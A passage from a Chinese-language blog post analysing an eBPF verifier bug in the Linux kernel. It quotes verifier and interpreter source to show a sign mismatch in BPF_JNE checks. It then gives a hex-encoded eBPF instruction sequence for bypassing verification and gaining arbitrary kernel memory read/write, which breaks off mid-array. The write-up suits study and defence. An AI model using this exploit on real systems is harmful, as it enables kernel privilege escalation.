eBPF only: signed &#x27;&gt;=&#x27; */BPF_CALL  0x80  /* eBPF BPF_JMP only: function call */BPF_EXIT  0x90  /* eBPF BPF_JMP only: function return */BPF_JLT   0xa0  /* eBPF only: unsigned &#x27;&lt;&#x27; */BPF_JLE   0xb0  /* eBPF only: unsigned &#x27;&lt;=&#x27; */BPF_JSLT  0xc0  /* eBPF only: signed &#x27;&lt;&#x27; */BPF_JSLE  0xd0  /* eBPF only: signed &#x27;&lt;=&#x27; */\n\n比如 BPF_ADD | BPF_X | BPF_ALU这条指令代表32位加法运算，将源寄存器的值加上目的寄存器的值，然后将结果存储到目的寄存器中：dst_reg = (u32) dst_reg + (u32) src_reg;\n并且，在eBPF指令集中没有了BPF_RET指令，用BPF_JMP | BPF_EXIT仅代替函数执行完退出，在函数退出之前，eBPF需要将返回值存储在R0中。\n对于加载（LOAD）和存储(STORE)指令，8-bit的代码域分为：\n+--------+--------+-------------------+| 3 bits | 2 bits |   3 bits          ||  mode  |  size  | instruction class |+--------+--------+-------------------+(MSB)                             (LSB)\n\n其中size分别有下面四种类型：\nBPF_W   0x00   ; word 4 byteBPF_H   0x08   ; half word 2 byteBPF_B   0x10   ; byte BPF_DW  0x18   ; double word 8 byte\n\n并且在内核中，每一条指令的信息都储存在bpf_insn结构体中：\nstruct bpf_insn &#123;    __u8    code;       /* opcode */    __u8    dst_reg:4;  /* dest register */    __u8    src_reg:4;  /* source register */    __s16   off;        /* signed offset */    __s32   imm;        /* signed immediate constant */&#125;;\n\neBPF代码加载执行流程 &amp; 检查分析加载执行流程用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件来（如往socket写数据）来触发内核执行用户提供的eBPF代码。eBPF模块可以让用户加载数据包过滤代码（eBPF代码）进入内核，在收到数据包时触发eBPF代码执行。可以编写一个简单的用户数据包过滤程序来触发执行eBPF代码，具体流程如下：\n* syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr)) ；创建全局变量map结构体，内核态用户态都可以访问。* syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr)) ；将用户态的BPF代码注入到内核，并对代码进行检查，并模拟执行。    * static int bpf_prog_load(union bpf_attr *attr) ；判断过滤模式        * int bpf_check(struct bpf_prog **prog, union bpf_attr *attr)            * check_cfg(env); 第一轮检查，检查是否存在环路            * do_check(env);  第二轮检查，详细扫描BPF代码的运行过程，跟踪分析寄存器和堆栈，检查是否有不符合规则的情况出现    * static unsigned int __bpf_prog_run(void *ctx, const struct bpf_insn *insn)；运行BPF指令，最后真正运行的的函数。* setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd))；将eBPF与特定的事件绑定，在收到数据包时触发eBPF代码执行。\n\n检查分析根据上述流程我们可以看到我们将BPF代码注入到内核中是发生在第二步中的，执行的函数为：bpf_prog_load\nstatic int bpf_prog_load(union bpf_attr *attr)&#123;  enum bpf_prog_type type = attr-&gt;prog_type;  struct bpf_prog *prog;  int err;  char license[128];  bool is_gpl;  if (CHECK_ATTR(BPF_PROG_LOAD))    return -EINVAL;  /* copy eBPF program license from user space */  if (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),                        sizeof(license) - 1) &lt; 0)    return -EFAULT;  license[sizeof(license) - 1] = 0;  /* eBPF programs must be GPL compatible to use GPL-ed functions */  is_gpl = license_is_gpl_compatible(license);  if (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)    return -EINVAL;  if (type == BPF_PROG_TYPE_KPROBE &amp;&amp;      attr-&gt;kern_version != LINUX_VERSION_CODE)    return -EINVAL;  if (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))    return -EPERM;  /* plain bpf_prog allocation */  prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);  if (!prog)    return -ENOMEM;  err = bpf_prog_charge_memlock(prog);  if (err)    goto free_prog_nouncharge;  prog-&gt;len = attr-&gt;insn_cnt;  err = -EFAULT;  if (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),                     prog-&gt;len * sizeof(struct bpf_insn)) != 0)    goto free_prog;  prog-&gt;orig_prog = NULL;  prog-&gt;jited = 0;  atomic_set(&amp;prog-&gt;aux-&gt;refcnt, 1);  prog-&gt;gpl_compatible = is_gpl ? 1 : 0;  /* find program type: socket_filter vs tracing_filter */  err = find_prog_type(type, prog);  if (err &lt; 0)    goto free_prog;  /* run eBPF verifier */  err = bpf_check(&amp;prog, attr);  if (err &lt; 0)    goto free_used_maps;  /* fixup BPF_CALL-&gt;imm field */  fixup_bpf_calls(prog);  /* eBPF program is ready to be JITed */  err = bpf_prog_select_runtime(prog);  if (err &lt; 0)    goto free_used_maps;  err = bpf_prog_new_fd(prog);  if (err &lt; 0)    /* failed to allocate fd */    goto free_used_maps;  return err;  free_used_maps:  free_used_maps(prog-&gt;aux);  free_prog:  bpf_prog_uncharge_memlock(prog);  free_prog_nouncharge:  bpf_prog_free(prog);  return err;&#125;\n\n可以看到在19行对ebpf license进行验证是否为GPL证书的一种，在21行检验了传入代码的长度，然后通过find_prog_type函数判断过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最后进入bpf_check函数进行进一步验证。\nint bpf_check(struct bpf_prog **prog, union bpf_attr *attr)&#123;  char __user *log_ubuf = NULL;  struct verifier_env *env;  int ret = -EINVAL;  if ((*prog)-&gt;len &lt;= 0 || (*prog)-&gt;len &gt; BPF_MAXINSNS)    return -E2BIG;  /* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,\t * allocate/free it every time bpf_check() is called\t */  env = kzalloc(sizeof(struct verifier_env), GFP_KERNEL);  if (!env)    return -ENOMEM;  env-&gt;prog = *prog;  /* grab the mutex to protect few globals used by verifier */  mutex_lock(&amp;bpf_verifier_lock);  if (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;    /* user requested verbose verifier output\t\t * and supplied buffer to store the verification trace\t\t */    log_level = attr-&gt;log_level;    log_ubuf = (char __user *) (unsigned long) attr-&gt;log_buf;    log_size = attr-&gt;log_size;    log_len = 0;    ret = -EINVAL;    /* log_* values have to be sane */    if (log_size &lt; 128 || log_size &gt; UINT_MAX &gt;&gt; 8 ||        log_level == 0 || log_ubuf == NULL)      goto free_env;    ret = -ENOMEM;    log_buf = vmalloc(log_size);    if (!log_buf)      goto free_env;  &#125; else &#123;    log_level = 0;  &#125;  ret = replace_map_fd_with_map_ptr(env);  if (ret &lt; 0)    goto skip_full_check;  env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,                                 sizeof(struct verifier_state_list *),                                 GFP_USER);  ret = -ENOMEM;  if (!env-&gt;explored_states)    goto skip_full_check;  ret = check_cfg(env);  if (ret &lt; 0)    goto skip_full_check;  env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);  ret = do_check(env);  skip_full_check:  while (pop_stack(env, NULL) &gt;= 0);  free_states(env);  if (ret == 0)    /* program is valid, convert *(u32*)(ctx + off) accesses */    ret = convert_ctx_accesses(env);  if (log_level &amp;&amp; log_len &gt;= log_size - 1) &#123;    BUG_ON(log_len &gt;= log_size);    /* verifier log exceeded user supplied buffer */    ret = -ENOSPC;    /* fall through to return what was recorded */  &#125;  /* copy verifier log back to user space including trailing zero */  if (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + 1) != 0) &#123;    ret = -EFAULT;    goto free_log_buf;  &#125;  if (ret == 0 &amp;&amp; env-&gt;used_map_cnt) &#123;    /* if program passed verifier, update used_maps in bpf_prog_info */    env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,                                              sizeof(env-&gt;used_maps[0]),                                              GFP_KERNEL);    if (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;      ret = -ENOMEM;      goto free_log_buf;    &#125;    memcpy(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,           sizeof(env-&gt;used_maps[0]) * env-&gt;used_map_cnt);    env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;    /* program is valid. Convert pseudo bpf_ld_imm64 into generic\t\t * bpf_ld_imm64 instructions\t\t */    convert_pseudo_ld_imm64(env);  &#125;  free_log_buf:  if (log_level)    vfree(log_buf);  free_env:  if (!env-&gt;prog-&gt;aux-&gt;used_maps)    /* if we didn&#x27;t copy map pointers into bpf_prog_info, release\t\t * them now. Otherwise free_bpf_prog_info() will release them.\t\t */    release_maps(env);  *prog = env-&gt;prog;  kfree(env);  mutex_unlock(&amp;bpf_verifier_lock);  return ret;&#125;\n\n这里首先是使用check_cfg函数借用了程序控制流图的思路来检查这个EBPF程序中是否有死循环和跳转到未初始化的位置，避免造成无法预期的风险。最后则是使用do_check函数模拟执行一次注入代码，会将注入代码的所有逻辑分支从头到尾都会被完全跑上一遍，会模拟每条指令的执行，包括堆栈、寄存器、访问内存、调用函数等。\n漏洞分析这里的漏洞发生在do_check函数和最后真正运行的__bpf_prog_run翻译结果不一致导致的。这里用如下代码来演示：\nBPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) &#123;        */BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */BPF_EXIT_INSN()\n\n首先看一下do_check函数中处理的事情：\ninit_reg_state(regs);insn_idx = 0;for (;;) &#123;\tstruct bpf_insn *insn;\tu8 class;\tint err;\tif (insn_idx &gt;= insn_cnt) &#123;\t\tverbose(&quot;invalid insn idx %d insn_cnt %d\\n&quot;,\t\t\tinsn_idx, insn_cnt);\t\treturn -EFAULT;\t&#125;\tinsn = &amp;insns[insn_idx]; \tclass = BPF_CLASS(insn-&gt;code);  // ...&#125;\n\n可以看到这里存在一个for死循环，最后会返回BPF_CLASS获得的指令操作码类型。\n第一条指令是BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)，BPF_MOV指令属于ALU大类中，在检测到指令类型是ALU，进入如下分支，调用check_alu_op()函数继续判断。\nif (class == BPF_ALU || class == BPF_ALU64) &#123;\terr = check_alu_op(env, insn);\tif (err)\t\treturn err;&#125;\n\n根据check_alu_op()函数，上面这条代码的指令操作码为BPF_MOV，进入如下分支。\nelse if (opcode == BPF_MOV) &#123;  ......    if (BPF_SRC(insn-&gt;code) == BPF_X) &#123;      if (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;        /* case: R1 = R2\t\t\t\t * copy register state to dest reg\t\t\t\t */        regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];      &#125; else &#123;         if (is_pointer_value(env, insn-&gt;src_reg)) &#123;          verbose(&quot;R%d partial copy of pointer\\n&quot;,                  insn-&gt;src_reg);          return -EACCES;        &#125;        regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;        regs[insn-&gt;dst_reg].map_ptr = NULL;      &#125;    &#125; else &#123; //BPF_K      /* case: R = imm\t\t\t * remember the value we stored into this reg\t\t\t */      regs[insn-&gt;dst_reg].type = CONST_IMM;       regs[insn-&gt;dst_reg].imm = insn-&gt;imm;    &#125;&#125;\n\n可以看到这里最后是将指令的立即数保存到了reg_state结构体中的：\nstruct reg_state &#123;  enum bpf_reg_type type;  union &#123;    /* valid when type == CONST_IMM | PTR_TO_STACK */    int imm;    /* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |\t\t *   PTR_TO_MAP_VALUE_OR_NULL\t\t */    struct bpf_map *map_ptr;  &#125;;&#125;;\n\n可以看到，这里的imm也是有符号整数，和bpf_insn结构体中的imm类型一致。检查第二条指令BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)，这是一条JMP指令，在do_check函数中会进入如下分支：\nelse if (class == BPF_JMP) &#123;  u8 opcode = BPF_OP(insn-&gt;code);  if (opcode == BPF_CALL) &#123;    if (BPF_SRC(insn-&gt;code) != BPF_K ||        insn-&gt;off != 0 ||        insn-&gt;src_reg != BPF_REG_0 ||        insn-&gt;dst_reg != BPF_REG_0) &#123;      verbose(&quot;BPF_CALL uses reserved fields\\n&quot;);      return -EINVAL;    &#125;    err = check_call(env, insn-&gt;imm);    if (err)      return err;  &#125; else if (opcode == BPF_JA) &#123;    if (BPF_SRC(insn-&gt;code) != BPF_K ||        insn-&gt;imm != 0 ||        insn-&gt;src_reg != BPF_REG_0 ||        insn-&gt;dst_reg != BPF_REG_0) &#123;      verbose(&quot;BPF_JA uses reserved fields\\n&quot;);      return -EINVAL;    &#125;    insn_idx += insn-&gt;off + 1;    continue;  &#125; else if (opcode == BPF_EXIT) &#123;    if (BPF_SRC(insn-&gt;code) != BPF_K ||        insn-&gt;imm != 0 ||        insn-&gt;src_reg != BPF_REG_0 ||        insn-&gt;dst_reg != BPF_REG_0) &#123;      verbose(&quot;BPF_EXIT uses reserved fields\\n&quot;);      return -EINVAL;    &#125;    /* eBPF calling convetion is such that R0 is used\t\t\t\t * to return the value from eBPF program.\t\t\t\t * Make sure that it&#x27;s readable at this time\t\t\t\t * of bpf_exit, which means that program wrote\t\t\t\t * something into it earlier\t\t\t\t */    err = check_reg_arg(regs, BPF_REG_0, SRC_OP);    if (err)      return err;    if (is_pointer_value(env, BPF_REG_0)) &#123;      verbose(&quot;R0 leaks addr as return value\\n&quot;);      return -EACCES;    &#125;    process_bpf_exit:    insn_idx = pop_stack(env, &amp;prev_insn_idx);    if (insn_idx &lt; 0) &#123;      break;    &#125; else &#123;      do_print_state = true;      continue;    &#125;  &#125; else &#123;    err = check_cond_jmp_op(env, insn, &amp;insn_idx);    if (err)      return err;  &#125;&#125;\n\n最后的else语句也就是JNE所进入的分支，所以会进一步进入check_cond_jmp_op函数。\nif (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;  if (opcode == BPF_JEQ) &#123;    /* if (imm == imm) goto pc+off;\t\t\t * only follow the goto, ignore fall-through\t\t\t */    *insn_idx += insn-&gt;off;    return 0;  &#125; else &#123;    /* if (imm != imm) goto pc+off;\t\t\t * only follow fall-through branch, since\t\t\t * that&#x27;s where the program will go\t\t\t */    return 0;  &#125;&#125;\n\n在函数内部存在这样一条if语句，由前面提到了在reg_state结构体中的imm和insn中的imm都是int类型，并且reg_state结构体中的imm是由insn中直接赋值过去的，所以这个条件会恒等。所以当操作码为BPF_JNE时，永远都不会跳转。\n上面是模拟执行的情况，那么下面看看真实执行情况是什么样子的，首先真实执行情况的函数为__bpf_prog_run:\nstatic unsigned int __bpf_prog_run(void *ctx, const struct bpf_insn *insn)&#123;\tu64 stack[MAX_BPF_STACK / sizeof(u64)];\tu64 regs[MAX_BPF_REG], tmp;\tstatic const void *jumptable[256] = &#123;\t\t[0 ... 255] = &amp;&amp;default_label,\t\t/* Now overwrite non-defaults ... */\t\t/* 32 bit ALU operations */\t\t[BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,\t\t[BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,\t\t[BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,\t\t[BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,\t\t[BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,\t\t[BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,\t\t[BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,\t\t[BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,\t\t[BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,\t\t[BPF_ALU | BPF_LSH | BPF_K] = &amp;&amp;ALU_LSH_K,\t\t[BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,\t\t[BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,\t\t[BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,    // ...  &#125;\n\n可以看到函数这里维护的是一个跳表，根据opcode来进行跳转，并且没有任何检测。这里重点关注一下上述例子中的跳转函数：\n/* Jumps */[BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,[BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,[BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,[BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,[BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,[BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,[BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,[BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,[BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,[BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,[BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,[BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,[BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,[BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,\n\n可以看到这里赋值的是JMP_JNE_K：\nJMP_JNE_K:if (DST != IMM) &#123;  insn += insn-&gt;off;  CONT_JMP;&#125;CONT;\n\n这里就比较关注DST和IMM的定义了：\n/* Named registers */#define DST\tregs[insn-&gt;dst_reg]#define SRC\tregs[insn-&gt;src_reg]#define FP\tregs[BPF_REG_FP]#define ARG1\tregs[BPF_REG_ARG1]#define CTX\tregs[BPF_REG_CTX]#define IMM\tinsn-&gt;imm\n\n可以看到这里IMM的定义依旧是从insn中拿出来的，然而这里的DST是直接从约定的寄存器中拿出来，然而在__bpf_prog_run函数的开头可以看出来这里的寄存器定义为unsigned long long int类型，那么如果重新执行上述演示代码就会出现跳转，也就是说检查和实际运行的指令执行流程会不一致，可以利用这个绕过安全检测。\n漏洞利用退出do_check但就目前来看依旧存在的一个问题就是虽然他会进入BPF_EXIT分支，但是在最后的pop_stack需要返回的值为负数才能结束循环退出do_check函数。\nelse if (opcode == BPF_EXIT) &#123;  if (BPF_SRC(insn-&gt;code) != BPF_K ||      insn-&gt;imm != 0 ||      insn-&gt;src_reg != BPF_REG_0 ||      insn-&gt;dst_reg != BPF_REG_0) &#123;    verbose(&quot;BPF_EXIT uses reserved fields\\n&quot;);    return -EINVAL;  &#125;  /* eBPF calling convetion is such that R0 is used\t\t\t\t * to return the value from eBPF program.\t\t\t\t * Make sure that it&#x27;s readable at this time\t\t\t\t * of bpf_exit, which means that program wrote\t\t\t\t * something into it earlier\t\t\t\t */  err = check_reg_arg(regs, BPF_REG_0, SRC_OP);  if (err)    return err;  if (is_pointer_value(env, BPF_REG_0)) &#123;    verbose(&quot;R0 leaks addr as return value\\n&quot;);    return -EACCES;  &#125;  process_bpf_exit:  insn_idx = pop_stack(env, &amp;prev_insn_idx);  if (insn_idx &lt; 0) &#123;    break;  &#125; else &#123;    do_print_state = true;    continue;  &#125;\n\nstatic int pop_stack(struct verifier_env *env, int *prev_insn_idx)&#123;\tstruct verifier_stack_elem *elem;\tint insn_idx;\tif (env-&gt;head == NULL)\t\treturn -1;\tmemcpy(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, sizeof(env-&gt;cur_state));\tinsn_idx = env-&gt;head-&gt;insn_idx;\tif (prev_insn_idx)\t\t*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;\telem = env-&gt;head-&gt;next;\tkfree(env-&gt;head);\tenv-&gt;head = elem;\tenv-&gt;stack_size--;\treturn insn_idx;&#125;\n\nstruct verifier_env &#123;\tstruct bpf_prog *prog;\t\t/* eBPF program being verified */\tstruct verifier_stack_elem *head; /* stack of verifier states to be processed */\tint stack_size;\t\t\t/* number of states to be processed */\tstruct verifier_state cur_state; /* current verifier state */\tstruct verifier_state_list **explored_states; /* search pruning optimization */\tstruct bpf_map *used_maps[MAX_USED_MAPS]; /* array of map&#x27;s used by eBPF program */\tu32 used_map_cnt;\t\t/* number of used maps */\tbool allow_ptr_leaks;&#125;;\n\n所以我们在实现构造时需要将head位置为0，根据函数名pop_stack可以推测出来这里其实也就是栈的操作，所以大致的构造方法是：\nBPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) &#123;        */BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */BPF_EXIT_INSN(),option,pandding == 0,options\n\n实现任意地址读写内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当r7和r8的值可控就可以达到内存任意写，类似于mov dword ptr[r7],r8这样的操作。\nelse if (class == BPF_LDX) &#123;  enum bpf_reg_type src_reg_type;  /* check for reserved fields is already done */  /* check src operand */  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);  if (err)    return err;  err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);  if (err)    return err;  src_reg_type = regs[insn-&gt;src_reg].type;  /* check that memory (src_reg + off) is readable,\t\t\t * the state of dst_reg will be updated by this func\t\t\t */  err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,                         BPF_SIZE(insn-&gt;code), BPF_READ,                         insn-&gt;dst_reg);  if (err)    return err;  if (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;    insn_idx++;    continue;  &#125;  if (insn-&gt;imm == 0) &#123;    /* saw a valid insn\t\t\t\t * dst_reg = *(u32 *)(src_reg + off)\t\t\t\t * use reserved &#x27;imm&#x27; field to mark this insn\t\t\t\t */    insn-&gt;imm = src_reg_type;  &#125; else if (src_reg_type != insn-&gt;imm &amp;&amp;             (src_reg_type == PTR_TO_CTX ||              insn-&gt;imm == PTR_TO_CTX)) &#123;    /* ABuser program is trying to use the same insn\t\t\t\t * dst_reg = *(u32*) (src_reg + off)\t\t\t\t * with different pointer types:\t\t\t\t * src_reg == ctx in one branch and\t\t\t\t * src_reg == stack|map in some other branch.\t\t\t\t * Reject it.\t\t\t\t */    verbose(&quot;same insn cannot be used with different pointers\\n&quot;);    return -EINVAL;  &#125;&#125; else if (class == BPF_STX) &#123;  enum bpf_reg_type dst_reg_type;  if (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;    err = check_xadd(env, insn);    if (err)      return err;    insn_idx++;    continue;  &#125;  /* check src1 operand */  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);  if (err)    return err;  /* check src2 operand */  err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);  if (err)    return err;  dst_reg_type = regs[insn-&gt;dst_reg].type;  /* check that memory (dst_reg + off) is writeable */  err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,                         BPF_SIZE(insn-&gt;code), BPF_WRITE,                         insn-&gt;src_reg);  if (err)    return err;  if (insn-&gt;imm == 0) &#123;    insn-&gt;imm = dst_reg_type;  &#125; else if (dst_reg_type != insn-&gt;imm &amp;&amp;             (dst_reg_type == PTR_TO_CTX ||              insn-&gt;imm == PTR_TO_CTX)) &#123;    verbose(&quot;same insn cannot be used with different pointers\\n&quot;);    return -EINVAL;  &#125;&#125;\n\ncheck_mem_access函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。所以这里使用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。\n最终构造的eBPF指令为：\n----------------------------------------------part 1 ----------------------------------------------1. &quot;\\xb4\\x09\\x00\\x00\\xff\\xff\\xff\\xff&quot;  /* BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),              r9 = (u32)0xFFFFFFFF   */2. &quot;\\x55\\x09\\x02\\x00\\xff\\xff\\xff\\xff&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),    if (r9 == -1) &#123;        */3. &quot;\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_IMM(BPF_REG_0, 0),                         exit(0);             */4. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_EXIT_INSN()                                                            */----------------------------------------------part 2 ----------------------------------------------5. &quot;\\x18\\x19\\x00\\x00\\x03\\x00\\x00\\x00&quot;  /*BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */6. &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;----------------------------------------------part 3 ----------------------------------------------/** BPF_MAP_GET(0, BPF_REG_6)  r6=op，取map中Key值为0的value值存放到reg_6* */10. &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */11. &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */12. &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;  /*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */13. &quot;\\x62\\x0a\\xfc\\xff\\x00\\x00\\x00\\x00&quot;  /*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = 0 */14. &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;  /*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),           */15. &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */16. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_EXIT_INSN(),                                  /*   exit(0);             */17. &quot;\\x79\\x06\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */----------------------------------------------part 4 ----------------------------------------------/** BPF_MAP_GET(1, BPF_REG_7)  r7=address,取map中Key值为1的value值存放到reg_7* */21. &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */22. &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */23. &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;  /*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */24. &quot;\\x62\\x0a\\xfc\\xff\\x01\\x00\\x00\\x00&quot;  /*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = 1 */25. &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;  /*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),          */26. &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */27. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_EXIT_INSN(),                                  /*   exit(0);             */28. &quot;\\x79\\x07\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */----------------------------------------------part 5 ----------------------------------------------/** BPF_MAP_GET(2, BPF_REG_8)  r8=value，取map中Key值为2的value值存放到reg_8* */32. &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */33. &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */34. &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;  /*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */35. &quot;\\x62\\x0a\\xfc\\xff\\x02\\x00\\x00\\x00&quot;  /*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=2),           /* *(u32 *)(fp - 4) = 2 */36. &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;  //BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),37. &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */38. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  